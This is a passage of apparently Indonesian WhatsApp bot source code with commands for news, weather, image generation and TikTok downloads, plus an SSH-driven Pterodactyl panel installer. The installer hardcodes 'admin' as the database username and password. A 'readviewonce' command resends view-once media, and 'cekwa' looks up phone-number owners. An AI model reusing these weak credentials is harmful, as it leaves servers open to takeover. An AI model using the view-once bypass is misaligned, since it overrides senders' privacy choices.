            xreply(`❌ Gagal memulai instalasi Wings: ${err.message}`)
            ress.end()
            return reject(err)
          }

          stream
            .on("close", async (code) => {
              if (code === 0) {
                resolve(await InstallNodes())
              } else {
                reject(new Error(`Wings installation failed with code ${code}`))
              }
            })
            .on("data", (data) => {
              const out = data.toString()
              console.log("Wings Install:", out)

              if (out.includes("Input 0-6")) stream.write("1\n")
              else if (out.includes("(y/N)")) stream.write("y\n")
              else if (out.includes("Enter the panel address (blank for any address)")) stream.write(`${domainPanel}\n`)
              else if (out.includes("Database host username (pterodactyluser)")) stream.write("admin\n")
              else if (out.includes("Database host password")) stream.write("admin\n")
              else if (out.includes("Set the FQDN to use for Let's Encrypt (node.example.com)")) stream.write(`${domainNode}\n`)
              else if (out.includes("Enter email address for Let's Encrypt")) stream.write("admin@gmail.com\n")
            })
            .stderr.on("data", (data) => {
              console.error("Wings Install Error:", data.toString())
            })
        })
      })
    }

    const instalPanel = async () => {
      return new Promise((resolve, reject) => {
        ress.exec(commandPanel, { pty: true }, (err, stream) => {
          if (err) return reject(err)

          stream
            .on("close", async (code) => {
              if (code === 0) {
                resolve(await instalWings())
              } else {
                reject(new Error(`Panel installation failed with code ${code}`))
              }
            })
            .on("data", (data) => {
              const out = data.toString()
              console.log("Panel Install:", out)

              if (out.includes("Input 0-6")) stream.write("0\n")
              else if (out.includes("(y/N)")) stream.write("y\n")
              else if (out.includes("Database name (panel)")) stream.write("\n")
              else if (out.includes("Database username (pterodactyl)")) stream.write("admin\n")
              else if (out.includes("Password (press enter to use randomly generated password)")) stream.write("admin\n")
              else if (out.includes("Select timezone [Europe/Stockholm]")) stream.write("Asia/Jakarta\n")
              else if (out.includes("Provide the email address that will be used to configure Let's Encrypt and Pterodactyl")) stream.write("admin@gmail.com\n")
              else if (out.includes("Email address for the initial admin account")) stream.write("admin@gmail.com\n")
              else if (out.includes("Username for the initial admin account")) stream.write("admin\n")
              else if (out.includes("First name for the initial admin account")) stream.write("admin\n")
              else if (out.includes("Last name for the initial admin account")) stream.write("admin\n")
              else if (out.includes("Password for the initial admin account")) stream.write(`${passwordPanel}\n`)
              else if (out.includes("Set the FQDN of this panel (panel.example.com)")) stream.write(`${domainPanel}\n`)
              else if (out.includes("Do you want to automatically configure UFW (firewall)")) stream.write("y\n")
              else if (out.includes("Do you want to automatically configure HTTPS using Let's Encrypt? (y/N)")) stream.write("y\n")
              else if (out.includes("Select the appropriate number [1-2] then [enter]")) stream.write("1\n")
              else if (out.includes("I agree that this HTTPS request is performed (y/N)")) stream.write("y\n")
              else if (out.includes("Proceed anyways")) stream.write("y\n")
              else if (out.includes("(yes/no)")) stream.write("y\n")
              else if (out.includes("Initial configuration completed. Continue with installation? (y/N)")) stream.write("y\n")
              else if (out.includes("Still assume SSL? (y/N)")) stream.write("y\n")
              else if (out.includes("Please read the Terms of Service")) stream.write("y\n")
              else if (out.includes("(A)gree/(C)ancel:")) stream.write("A\n")
            })
            .stderr.on("data", (data) => {
              console.error("Panel Stderr:", data.toString())
            })
        })
      })
    }

    ress.on("ready", async () => {
      try {
        await client.sendMessage(m.chat, {
          text:
            `⚙️ *Memproses Install Server Panel*\n\n` +
            `*🌐 IP Address:* ${ipHost}\n` +
            `*🖥️ Domain Panel:* ${domainPanel}\n` +
            `*🖥️ Domain Node:* ${domainNode}\n` +
            `*💾 RAM Server:* ${ramServer} MB\n\n` +
            `⏳ Mohon tunggu *10-20 menit* hingga proses install selesai...`
        }, { quoted: m })

        await instalPanel()
      } catch (error) {
        await client.sendMessage(m.chat, {
          text: `❌ Error saat instalasi:\n${error.message}`
        }, { quoted: m })
        try { ress.end() } catch { }
      }
    })

    ress.on("error", async (err) => {
      await client.sendMessage(m.chat, {
        text: `❌ Gagal terhubung ke server:\n${err.message}\n\nPastikan IP & password VPS benar dan SSH aktif di port 22.`
      }, { quoted: m })
      try { ress.end() } catch { }
    })

    try {
      ress.connect(connSettings)
    } catch (error) {
      await client.sendMessage(m.chat, {
        text: `❌ Gagal menghubungkan:\n${error.message}`
      }, { quoted: m })
    }
  }
  break

  /// ───────────── [ 𝖥𝗋𝖾𝖾 𝖥𝗂𝗋𝖾 𝖭𝖾𝗐𝗌 ] ──────────── ///
  case "ffnews": {
    try {
      const axios = require("axios")

      await xreply("⏳ Mengambil berita Free Fire...")

      const { data } = await axios.get("https://api.nexray.eu.cc/berita/ffnews")

      if (!data.status) {
        return xreply("❌ Gagal mengambil berita.")
      }

      const berita = data.result.data

      if (!berita || berita.length === 0) {
        return xreply("❌ Berita tidak ditemukan.")
      }

      let teks = `╭━━〔 📰 *FREE FIRE NEWS* 〕━━⬣
┃ 📑 Total : ${data.result.total}
┃ 🕒 Update : ${data.timestamp}
╰━━━━━━━━━━━━━━⬣

`

      for (let i = 0; i < berita.length; i++) {
        teks += `*${i + 1}. ${berita[i].title}*\n`
        teks += `📅 ${berita[i].date}\n`
        teks += `🔗 ${berita[i].link}\n\n`
      }

      await client.sendMessage(m.chat, {
        text: teks
      }, { quoted: m })

    } catch (e) {
      console.log(e)
      xreply(`❌ Error\n${e.message}`)
    }
  }
  break

  /// ───────────── [ 𝖣𝖾𝗍𝗂𝗄 𝖭𝖾𝗐𝗌 ] ──────────── ///
  case 'detikcom': {
    try {
      await xreply("⏳ Mengambil berita Detik...");

      const axios = require("axios");

      const { data } = await axios.get("https://api.synoxcloud.xyz/berita/detik");

      if (!data || data.statusCode !== 200 || !data.result) {
        return xreply("❌ API tidak mengembalikan data yang valid.");
      }

      const berita = data.result;

      if (!Array.isArray(berita) || berita.length === 0) {
        return xreply("❌ Tidak ada berita yang tersedia saat ini.");
      }

      let teks = `📰 *DETIKCOM NEWS UPDATE*\n`;
      teks += `━━━━━━━━━━━━━━━\n\n`;

      berita.slice(0, 10).forEach((item, i) => {
        const title = item.title || "No Title";
        const link = item.link || "-";
        const time = item.time ? `⏰ ${item.time}\n` : "";

        teks += `*${i + 1}. ${title}*\n`;
        teks += `${time}`;
        teks += `🔗 ${link}\n\n`;
      });

      teks += `━━━━━━━━━━━━━━━\n`;
      teks += `📊 Total API: ${data.total || berita.length}`;

      xreply(teks);

    } catch (e) {
      console.log("Error detikcom:", e);
      xreply("❌ Gagal mengambil berita (API error / koneksi gagal).");
    }
  }
  break;

  /// ───────────── [ 𝖦𝖯𝖳 𝖤𝖽𝗂𝗍 𝖨𝗆𝖺𝗀𝖾 ] ──────────── ///
  case "editgpt": {
    try {
      if (!text) {
        return xreply(`Contoh penggunaan:

.editgpt https://g.top4top.io/p_3820pfcz81.jpg,Ubah jadi lebih HD

Format:
.editgpt imageUrl,prompt`)
      }

      let [imageUrl, prompt] = text.split(",")

      if (!imageUrl || !prompt) {
        return xreply(`Format salah!

Contoh:
.editgpt https://g.top4top.io/p_3820pfcz81.jpg,Ubah jadi lebih HD`)
      }

      await xreply("⏳ Sedang memproses gambar dengan GPT Image...")

      let api = `https://api.synoxcloud.xyz/edit/gpt-image?imageUrl=${encodeURIComponent(imageUrl.trim())}&prompt=${encodeURIComponent(prompt.trim())}`

      await client.sendMessage(m.chat, {
        image: { url: api },
        caption: `🖼️ *GPT IMAGE EDITOR*

🔗 Image URL: ${imageUrl}
📝 Prompt: ${prompt}

✅ Berhasil diproses`
      }, { quoted: m })

    } catch (e) {
      console.log(e)
      xreply(`Error:\n${e.message}`)
    }
  }
  break

  case "edit": {
    try {
      if (!text) return xreply(`Contoh penggunaan:

.edit Ubah jadi pose dua jari

Reply/kirim foto lalu beri caption tersebut`)

      if (!/image/.test(mime)) {
        return xreply("Reply foto dengan caption .edit prompt")
      }

      await xreply("⏳ Sedang mengedit gambar...")

      let media = await client.downloadAndSaveMediaMessage(qmsg)

      const { ImageUploadService } = require('node-upload-images')
      const service = new ImageUploadService('pixhost.to')

      let { directLink } = await service.uploadFromBinary(
        fs.readFileSync(media),
        'rafaofficial.png'
      )

      let api = `https://api.synoxcloud.xyz/edit/nanobanana?url=${encodeURIComponent(directLink)}&prompt=${encodeURIComponent(text)}`

      await client.sendMessage(m.chat, {
        image: { url: api },
        caption: `🍌 *Nano Banana Edit*

📝 Prompt: ${text}`
      }, { quoted: m })

      fs.unlinkSync(media)

    } catch (e) {
      console.log(e)
      xreply(`Error:\n${e.message}`)
    }
  }
  break

  /// ───────────── [ 𝖠𝗎𝗍𝗈 𝖠𝖨 𝖢𝗁𝖺𝗍 ] ──────────── ///
  case "claudeai2": {
    if (!isOwner) return xreply("Khusus Owner")

    global.autoClaude2 ??= {}

    if (!text) {
      return xreply(`Contoh:

.claudeai2 on
.claudeai2 off

Status : ${global.autoClaude2[m.chat] ? "ON ✅" : "OFF ❌"}`)
    }

    if (text.toLowerCase() === "on") {
      global.autoClaude2[m.chat] = true
      return xreply("✅ Auto Claude AI 2 Aktif")
    }

    if (text.toLowerCase() === "off") {
      delete global.autoClaude2[m.chat]
      return xreply("❌ Auto Claude AI 2 Nonaktif")
    }
  }
  break

  case "claudeai": {
    if (!isOwner) return xreply("Khusus Owner")

    global.autoClaude ??= {}

    if (!text) {
      return xreply(`Contoh:

.claudeai on
.claudeai off

Status : ${global.autoClaude[m.chat] ? "ON ✅" : "OFF ❌"}`)
    }

    if (text.toLowerCase() === "on") {
      global.autoClaude[m.chat] = true
      return xreply("✅ Auto Claude AI Aktif")
    }

    if (text.toLowerCase() === "off") {
      delete global.autoClaude[m.chat]
      return xreply("❌ Auto Claude AI Nonaktif")
    }
  }
  break

  /// ───────────── [ 𝖢𝗎𝖺𝖼𝖺 & 𝖪𝖺𝗅𝖾𝗇𝖽𝖾𝗋 ] ──────────── ///
  case 'cuaca': {
    try {
      if (!text) {
        return xreply(`Contoh penggunaan:

.cuaca tanjungbalai`);
      }

      const axios = require('axios')

      let { data } = await axios.get(
        `https://api.synoxcloud.xyz/search/cuaca?kota=${encodeURIComponent(text)}`
      )

      if (!data.status) {
        return xreply('Data cuaca tidak ditemukan')
      }

      let res = data.data

      let cuaca = {
        0: 'Cerah',
        1: 'Cerah Berawan',
        2: 'Sebagian Berawan',
        3: 'Berawan',
        45: 'Berkabut',
        48: 'Kabut Tebal',
        51: 'Gerimis Ringan',
        53: 'Gerimis Sedang',
        55: 'Gerimis Lebat',
        61: 'Hujan Ringan',
        63: 'Hujan Sedang',
        65: 'Hujan Lebat',
        71: 'Salju Ringan',
        73: 'Salju Sedang',
        75: 'Salju Lebat',
        80: 'Hujan Lokal Ringan',
        81: 'Hujan Lokal Sedang',
        82: 'Hujan Lokal Lebat',
        95: 'Badai Petir'
      }

      let caption = `🌦️ *INFO CUACA*\n\n`
      caption += `🏙️ Kota : ${res.kota}\n`
      caption += `🌍 Negara : ${res.negara}\n`
      caption += `🌡️ Suhu : ${res.suhu_celsius}°C\n`
      caption += `💨 Angin : ${res.kecepatan_angin_kmh} km/j\n`
      caption += `☁️ Kondisi : ${cuaca[res.kode_cuaca] || res.kode_cuaca}\n`
      caption += `🕒 Waktu : ${res.waktu}\n`

      await xreply(caption)

    } catch (e) {
      console.log(e)
      xreply('Gagal mengambil data cuaca')
    }
  }
  break;

  case 'cekkalender':
  case 'createkalender': {
    let args = text.split(' ');
    if (args.length < 2) return reply('Format salah! Gunakan: ckalender bulan tahun');
    let month = args[0];
    let year = args[1];
    if (isNaN(month) || isNaN(year)) return xreply('Bulan dan tahun harus berupa angka!');
    let apiUrl = `https://fastrestapis.fasturl.cloud/maker/calendar/simple?month=${month}&year=${year}`;
    client.sendMessage(m.chat, { image: { url: apiUrl }, caption: `Kalender bulan ${month} tahun ${year}` }, { quoted: m });
  }
  break

  case "cekgempa": {
    xreply("Memproses pencarian");

    try {
      const response = await fetch("https://data.bmkg.go.id/DataMKG/TEWS/autogempa.json");
      const data = await response.json();

      if (!data || !data.Infogempa || !data.Infogempa.gempa) {
        return xreply("Gagal mendapatkan data gempa dari BMKG.");
      }

      const gempa = data.Infogempa.gempa;

      let caption = `*📈 INFO GEMPA TERKINI*\n\n`;
      caption += `*Tanggal:* ${gempa.Tanggal}\n`;
      caption += `*Waktu:* ${gempa.Jam}\n`;
      caption += `*Magnitudo:* ${gempa.Magnitude}\n`;
      caption += `*Kedalaman:* ${gempa.Kedalaman}\n`;
      caption += `*Lokasi:* ${gempa.Wilayah}\n`;
      caption += `*Koordinat:* ${gempa.Lintang} ${gempa.Bujur}\n`;
      caption += `*Potensi:* ${gempa.Potensi}\n`;
      caption += `*Dirasakan:* ${gempa.Dirasakan}\n\n`;
      caption += `Sumber: BMKG (https://www.bmkg.go.id/)`;

      if (gempa.Shakemap) {
        const shakemapUrl = `https://data.bmkg.go.id/DataMKG/TEWS/${gempa.Shakemap}`;
        await client.sendMessage(m.chat, {
          image: { url: shakemapUrl },
          caption: caption
        }, { quoted: m });
      } else {
        client.sendMessage(m.chat, { text: caption }, { quoted: m });
      }
    } catch (error) {
      console.log(error);
      xreply("Terjadi kesalahan saat mengambil data gempa.");
    }
  }
  break

  /// ───────────── [ 𝖥𝖺𝗄𝖾 𝖬𝗈𝗏𝗂𝖾 ] ──────────── ///
  case 'fakemovi4': {
    try {
      if (!text) {
        return xreply(`Contoh penggunaan:

.fakemovi4 Jangan Banyak kali bacot mu sepakat?`);
      }

      let quote = text.trim();

      let api = `https://api.synoxcloud.xyz/canvas/quotes-v5?text=${encodeURIComponent(quote)}`;

      await client.sendMessage(
        m.chat,
        {
          image: { url: api },
          caption: `🎬 *FAKE MOVI V4*

💬 Text :
${quote}`
        },
        { quoted: m }
      );

    } catch (e) {
      console.error(e);
      xreply('Gagal membuat Quotes V4');
    }
  }
  break;

  case 'fakemovi3': {
    try {
      if (!text) {
        return xreply(`Contoh penggunaan:

.fakemovi3 Jangan caper mu untuk menjadikan mencari perhatian orang lain`);
      }

      let quote = text.trim();

      let api = `https://api.synoxcloud.xyz/canvas/quotes-v4?text=${encodeURIComponent(quote)}`;

      await client.sendMessage(
        m.chat,
        {
          image: { url: api },
          caption: `🎬 *FAKE MOVI V3*

💬 Text :
${quote}`
        },
        { quoted: m }
      );

    } catch (e) {
      console.error(e);
      xreply('Gagal membuat Quotes V4');
    }
  }
  break;

  case 'fakemovi2': {
    try {
      if (!text) {
        return xreply(`Contoh penggunaan:

.fakemovi2 Tak semua kawan itu yang [bisa] menerima kita saat susah,MISTER-MD

Format:
.fakemovi2 quote,author`);
      }

      let [quote, author] = text.split(',');

      if (!quote || !author) {
        return xreply(`Format salah!

Contoh:
.fakemovi2 Tak semua kawan itu yang [bisa] menerima kita saat susah,MISTER-MD`);
      }

      let api = `https://api.synoxcloud.xyz/canvas/quotes-v1?quote=${encodeURIComponent(quote.trim())}&author=${encodeURIComponent(author.trim())}`;

      await client.sendMessage(
        m.chat,
        {
          image: { url: api },
          caption: `🎬 *FAKE MOVI V2*

💬 Quote : ${quote.trim()}
✍️ Author : ${author.trim()}`
        },
        { quoted: m }
      );

    } catch (e) {
      console.error(e);
      xreply('Gagal membuat Quotes');
    }
  }
  break;

  case "fakemovi": {
    try {
      const fs = require("fs")
      const path = require("path")
      const https = require("https")
      const { createCanvas, loadImage, registerFont } = require("canvas")

      if (global.__fakemoviFont === undefined) {
        global.__fakemoviFont = "sans-serif"

        try {
          const FONT_DIR = path.join(__dirname, "fonts")
          const FONT_PATH = path.join(FONT_DIR, "PatrickHand-Regular.ttf")
          const FONT_URL =
            "https://raw.githubusercontent.com/google/fonts/main/ofl/patrickhand/PatrickHand-Regular.ttf"

          if (!fs.existsSync(FONT_DIR)) {
            fs.mkdirSync(FONT_DIR, { recursive: true })
          }

          if (!fs.existsSync(FONT_PATH)) {
            await new Promise((resolve, reject) => {
              const file = fs.createWriteStream(FONT_PATH)
              https
                .get(FONT_URL, (res) => {
                  if (res.statusCode !== 200) {
                    file.close()
                    fs.unlink(FONT_PATH, () => { })
                    return reject(new Error(`HTTP ${res.statusCode}`))
                  }
                  res.pipe(file)
                  file.on("finish", () => file.close(resolve))
                })
                .on("error", (err) => {
                  fs.unlink(FONT_PATH, () => { })
                  reject(err)
                })
            })
          }

          registerFont(FONT_PATH, { family: "QuoteFont" })
          global.__fakemoviFont = "QuoteFont"
        } catch (fontErr) {
          console.log("⚠️ Gagal load font custom, pakai font default:", fontErr.message)
        }
      }

      const FONT_FAMILY = global.__fakemoviFont

      if (!text) {
        return xreply(
          `Contoh penggunaan:\n\n.fakemovi Tidak selalu hidup berjalan dengan baik,@MISTER-MD`
        )
      }

      let [quote, author] = text.split(",")

      if (!quote) {
        return xreply(
          `Contoh:\n\n.fakemovi Tidak selalu hidup berjalan dengan baik,@MISTER-MD`
        )
      }

      quote = quote.trim()
      author = author ? author.trim() : "@MISTER-MD"

      await xreply("⏳ Membuat fake motivasi...")

      const bg = await loadImage(
        "https://img2.pixhost.to/images/8609/738395416_rafaofficial.jpg"
      )

      const canvas = createCanvas(bg.width, bg.height)
      const ctx = canvas.getContext("2d")

      ctx.drawImage(bg, 0, 0, bg.width, bg.height)

      const CENTER_X = 540
      const CENTER_Y = 560

      const MAX_WIDTH = 650
      const MAX_HEIGHT = 240

      function wrapText(ctx, text, maxWidth) {
        const words = text.trim().split(/\s+/)
        let lines = []
        let line = ""

        for (const word of words) {
          const testLine = line ? line + " " + word : word

          if (ctx.measureText(testLine).width > maxWidth) {
            if (line) lines.push(line)
            line = word
          } else {
            line = testLine
          }
        }

        if (line) lines.push(line)
        return lines
      }

      let fontSize = 64
      let lines = []

      while (fontSize >= 28) {
        ctx.font = `${fontSize}px "${FONT_FAMILY}"`

        lines = wrapText(ctx, quote, MAX_WIDTH)

        const lineHeight = fontSize * 1.15
        const totalHeight = lines.length * lineHeight

        if (totalHeight <= MAX_HEIGHT) break

        fontSize -= 2
      }

      ctx.font = `${fontSize}px "${FONT_FAMILY}"`
      ctx.fillStyle = "#733A25"
      ctx.textAlign = "center"
      ctx.textBaseline = "middle"

      const lineHeight = fontSize * 1.15
      const totalHeight = lines.length * lineHeight
      const startY = CENTER_Y - totalHeight / 2 + lineHeight / 2

      for (let i = 0; i < lines.length; i++) {
        ctx.fillText(lines[i], CENTER_X, startY + i * lineHeight)
      }

      ctx.font = `36px "${FONT_FAMILY}"`
      ctx.fillStyle = "#7F4C1D"
      ctx.textAlign = "center"
      ctx.fillText(author, CENTER_X, 935)

      const buffer = canvas.toBuffer("image/png")

      await client.sendMessage(
        m.chat,
        {
          image: buffer,
          caption: "✅ Fake Motivasi Berhasil"
        },
        { quoted: m }
      )

    } catch (e) {
      console.log(e)
      xreply(`❌ Error:\n${e.message}`)
    }
  }
  break
  
    case "rvo":
    case "readviewonce": {
        if (!isOwner) return m.reply("❌ Fitur ini hanya bisa digunakan oleh Owner bot!");
    
        if (!m.quoted) return m.reply(example("dengan reply pesannya"))
        let msg = m.quoted.message
        let type = Object.keys(msg)[0]
        if (!msg[type].viewOnce) return m.reply("Pesan itu bukan viewonce!")
    
        let media = await downloadContentFromMessage(
            msg[type],
            type == 'imageMessage' ? 'image' : type == 'videoMessage' ? 'video' : 'audio'
        )
    
        let buffer = Buffer.from([])
        for await (const chunk of media) {
            buffer = Buffer.concat([buffer, chunk])
        }
    
        if (/video/.test(type)) {
            return fitt.sendMessage(m.chat, {
                video: buffer,
                caption: msg[type].caption || ""
            }, {quoted: m})
        } else if (/image/.test(type)) {
            return fitt.sendMessage(m.chat, {
                image: buffer,
                caption: msg[type].caption || ""
            }, {quoted: m})
        } else if (/audio/.test(type)) {
            return fitt.sendMessage(m.chat, {
                audio: buffer,
                mimetype: "audio/mpeg",
                ptt: true
            }, {quoted: m})
        }
    }
    break

  /// ───────────── [ 𝖢𝖾𝗄 𝖶𝖧𝖠𝖳𝖲𝖠𝖯𝖯 ] ──────────── ///
  case "cekwa": {
    try {
      if (!text)
        return xreply(
          `Contoh penggunaan:

.cekwa 62××××
.cekwa 08××××`
        )

      let nomor = text.replace(/[^0-9]/g, "")

      if (nomor.startsWith("08")) {
        nomor = "62" + nomor.slice(1)
      }

      await xreply("⏳ Sedang mengecek nomor WhatsApp...")

      const axios = require("axios")

      const { data } = await axios.get(
        `https://api.synoxcloud.xyz/check/cekwa?nomor=${nomor}`
      )

      if (!data.status || !data.result) {
        return xreply("❌ Nomor tidak ditemukan atau API sedang error")
      }

      let hasil = `*📱 CEK WHATSAPP*\n\n`
      hasil += `• Nomor : ${data.result.nomor || "-"}\n`
      hasil += `• WA ID : ${data.result.waId || "-"}\n`
      hasil += `• Status : ${data.result.aktif ? "Terdaftar ✅" : "Tidak Terdaftar ❌"}\n`
      hasil += `• Keterangan : ${data.result.keterangan || "-"}\n`
      hasil += `• Nama : ${data.result.nama || "Tidak ada"}\n`

      if (data.result.foto) {
        await client.sendMessage(
          m.chat,
          {
            image: { url: data.result.foto },
            caption: hasil
          },
          { quoted: m }
        )
      } else {
        xreply(hasil)
      }

    } catch (e) {
      console.log(e)
      xreply(
        `❌ Error:\n${e.response?.data?.message || e.message}`
      )
    }
  }
  break

  /// ───────────── [ 𝖥𝖺𝗄𝖾 𝖣𝖾𝗏 & 𝖯𝗂𝗅𝗂𝗁 ] ──────────── ///
  case "fakedev": {
    try {
      if (!text)
        return xreply(
          `Contoh:

.fakedev https://i.ibb.co/xxxxx.jpg,MISTER-MD,Stay Amanah`
        )

      let args = text.split(",")

      if (args.length < 3)
        return xreply(
          `Format salah!

.fakedev https://i.ibb.co/xxxxx.jpg,MISTER-MD,Stay Amanah`
        )

      let urlfoto = args[0].trim()
      let text1 = args[1].trim()
      let text2 = args.slice(2).join(",").trim()

      const api =
        `https://api.synoxcloud.biz.id/canvas/fakedev?urlfoto=${encodeURIComponent(urlfoto)}&text1=${encodeURIComponent(text1)}&text2=${encodeURIComponent(text2)}`

      await client.sendMessage(
        m.chat,
        {
          image: { url: api },
          caption: "✅ FakeDev berhasil dibuat"
        },
        {
          quoted: m
        }
      )

    } catch (e) {
      console.log(e)
      xreply(String(e.message))
    }
  }
  break

  case "fakepilih": {
    if (!text) {
      return xreply(
        "Contoh:\n.fakepilih Messi,Ronaldo"
      )
    }

    let [teks1, teks2] = text.split(",")

    if (!teks1 || !teks2) {
      return xreply(
        "Format salah!\nContoh:\n.fakepilih Messi,Ronaldo"
      )
    }

    try {
      await xreply("⏳ Membuat gambar...")

      const url = `https://api.synoxcloud.xyz/canvas/drakehotline?teks1=${encodeURIComponent(teks1.trim())}&teks2=${encodeURIComponent(teks2.trim())}`

      await client.sendMessage(
        m.chat,
        {
          image: { url },
          caption: `✅ Fake Pilih Berhasil`
        },
        { quoted: m }
      )

    } catch (e) {
      console.error(e)
      xreply(`❌ Error: ${e.message}`)
    }
  }
  break

  /// ───────────── [ 𝖳𝗂𝗄𝖳𝗈𝗄 𝖣𝗈𝗐𝗇𝗅𝗈𝖺𝖽𝖾𝗋 ] ──────────── ///
  case "tiktok2":
  case "tt2": {
    if (!text) return xreply(".tiktok link")

    try {
      await xreply("⏳ Processing...")

      const api = "https://api.azbry.com/api/download/tiktok?url=" + encodeURIComponent(text)

      const res = await fetch(api)
      const json = await res.json()

      if (!json.status) throw "Video tidak ditemukan"

      const vid = json.result.links[0]
      const mp3 = json.result.music.url

      await client.sendMessage(m.chat, {
        video: { url: vid },
        caption: json.result.title || "TikTok Downloader"
      }, { quoted: m })

      await client.sendMessage(m.chat, {
        audio: { url: mp3 },
        mimetype: "audio/mpeg"
      }, { quoted: m })

    } catch (e) {
      console.log(e)
      xreply(String(e))
    }
  }
  break

  case 'ttmp3':
  case 'tiktokmp3': {
    try {
      if (!text) return xreply(`*Contoh: ${prefix + command} https://vt.tiktok.com/...*`);

      await client.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });

      let res = await fetch('https://ttsave.app/download', {
        method: 'POST',
        headers: {
          'Accept': 'application/json, text/plain, */*',
          'Content-Type': 'application/json',
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
        },
        body: JSON.stringify({
          query: text,
          language_id: '2'
        })
      });

      let html = await res.text();

      let regex = /href="(https:\/\/v16-ies-music\.tiktokcdn\.com\/[^"]+)"/g;
      let audioUrl;
      let match;

      while ((match = regex.exec(html)) !== null) {
        if (match[1].includes('mime_type=audio')) {
          audioUrl = match[1];
          break;
        }
      }

      if (!audioUrl) {
        return xreply('🍂 *Audio TikTok tidak ditemukan*');
      }

      await client.sendMessage(
        m.chat,
        {
          audio: { url: audioUrl },
          mimetype: 'audio/mpeg'
        },
        { quoted: m }
      );

    } catch (e) {
      await xreply(`🍂 *Terjadi kesalahan*\n${e.message}`);
    } finally {
      await client.sendMessage(m.chat, { react: { text: '', key: m.key } });
    }
  };
  break

  case "tt":
  case "tiktok": {
    if (!text) return xreply(example("url"))
    if (!text.startsWith("https://")) return xreply(example("url"))
    await tiktokDl(q).then(async (result) => {
      await client.sendMessage(m.chat, { react: { text: '📥', key: m.key } })
      if (!result.status) return xreply("Error")
      if (result.durations == 0 && result.duration == "0 Seconds") {
        let araara = new Array()
        let urutan = 0
        for (let a of result.data) {
          let imgsc = await prepareWAMessageMedia({ image: { url: `${a.url}` } }, { upload: client.waUploadToServer })
          await araara.push({
            header: proto.Message.InteractiveMessage.Header.fromObject({
              title: `Foto Slide Ke *${urutan += 1}*`,
              hasMediaAttachment: true,
              ...imgsc
            }),
            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
              buttons: [{
                "name": "cta_url",
                "buttonParamsJson": `{\"display_text\":\"Link Tautan Foto\",\"url\":\"${a.url}\",\"merchant_url\":\"https://www.google.com\"}`
              }]
            })
          })
        }
        const msgii = await generateWAMessageFromContent(m.chat, {
          viewOnceMessageV2Extension: {
            message: {
              messageContextInfo: {
                deviceListMetadata: {},
                deviceListMetadataVersion: 2
              }, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                body: proto.Message.InteractiveMessage.Body.fromObject({
                  text: "*video tiktok berhasil ke download ✅*"
                }),
                carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                  cards: araara
                })
              })
            }
          }
        }, { userJid: m.sender, quoted: m })
        await client.relayMessage(m.chat, msgii.message, {
          messageId: msgii.key.id
        })
      } else {
        let urlVid = await result.data.find(e => e.type == "nowatermark_hd" || e.type == "nowatermark")
        await client.sendMessage(m.chat, { video: { url: urlVid.url }, mimetype: 'video/mp4', caption: `*video tiktok berhasil ke download ✅*` }, { quoted: m })
      }
    }).catch(e => console.log(e))
    await client.sendMessage(m.chat, { react: { text: '', key: m.key } })
  }
  break

  case 'tthd':
  case 'tiktokhd': {
    let reactKey
    try {
      if (!args[0]) throw `Contoh:\n${prefix}${command} <url tiktok>`
      const url = args[0]
      if (!/https?:\/\/(vm|vt|www)\.tiktok\.com/i.test(url)) throw 'URL TikTok tidak valid'

      reactKey = m.key
      await client.sendMessage(m.chat, { react: { text: '⏳', key: reactKey } })

      const api = `https://api.yupra.my.id/api/downloader/tiktok?url=${encodeURIComponent(url)}`
      const res = await fetch(api)
      const json = await res.json()

      if (json.status !== 200 || !json.result?.data) throw 'Gagal mengambil video'

      const media = json.result.data
      const video =
        media.find(v => v.type === 'nowatermark_hd')?.url ||
        media.find(v => v.type === 'nowatermark')?.url ||
        media.find(v => v.type === 'watermark')?.url

      if (!video) throw 'Video tidak ditemukan'

      await client.sendMessage(
        m.chat,
        { video: { url: video }, caption: '> Powered by YP AI' },
        { quoted: m }
      )

      setTimeout(() => {
        client.sendMessage(m.chat, { react: { text: '', key: reactKey } })
      }, 2000)
    } catch (e) {
      if (reactKey) {
        setTimeout(() => {
          client.sendMessage(m.chat, { react: { text: '', key: reactKey } })
        }, 2000)
      }
      await client.sendMessage(
        m.chat,
        { text: typeof e === 'string' ? e : 'Terjadi kesalahan' },
        { quoted: m }
      )
    }
  }
  break

  /// ───────────── [ 𝖰𝗎𝗈𝗍𝖾𝗌 𝖬𝖺𝗄𝖾𝗋 ] ──────────── ///
  case 'quotesmaker': {
    try {
      if (!text) {
        return xreply(
          `Contoh penggunaan:\n\n.quotesmaker Halo dek ku,MISTER-MD`
        )
      }

      if (!text.includes(',')) {
        return xreply(
          `Format salah!\n\nContoh:\n.quotesmaker Halo dek ku,MISTER-MD`
        )
      }

      let [quote, author] = text.split(',')

      quote = quote?.trim()
      author = author?.trim()

      if (!quote || !author) {
        return xreply(
          `Format salah!\n\nContoh:\n.quotesmaker Halo dek ku,MISTER-MD`
        )
      }

      await xreply('⏳ Membuat quotes...')

      const api = `https://api.azbry.com/api/maker/quotesmaker?text=${encodeURIComponent(quote)}&author=${encodeURIComponent(author)}`

      await client.sendMessage(
        m.chat,
        {
          image: { url: api },
          caption: `✨ Quotes Maker\n\n📝 Text: ${quote}\n👤 Author: ${author}`
        },
        {
          quoted: m
        }
      )

    } catch (e) {
      console.error(e)
      xreply(`❌ Error: ${e.message}`)
    }
  }
  break

  /// ───────────── [ 𝖥𝖺𝗄𝖾 𝖶𝗂𝗇𝖽𝗈𝗐𝗌 ] ──────────── ///
  case 'fakewindos2':
  case 'fakewindows': {
    try {
      if (!text) {
        return xreply(
          `Contoh:\n.fakewindos kenapa ya yang tulus sering kalah`
        )
      }

      const kata = text.trim().split(/\s+/)

      let lines = []

      if (kata.length <= 5) {
        lines = kata
      } else {
        for (let i = 0; i < kata.length; i += 2) {
          lines.push(kata.slice(i, i + 2).join(' '))
        }
      }

      const { createCanvas, loadImage } = require('canvas')

      const bg = await loadImage(
        'https://api.nexadev.my.id/uploder/uploads/TyIyEi.jpg'
      )

      const W = bg.width
      const H = bg.height

      const canvas = createCanvas(W, H)
      const ctx = canvas.getContext('2d')

      ctx.drawImage(bg, 0, 0, W, H)

      const AREA_X = W * 0.09
      const AREA_Y = H * 0.33
      const AREA_W = W * 0.33
      const AREA_H = H * 0.40

      let fontSize = Math.floor(H * 0.065)

      ctx.fillStyle = '#000000'
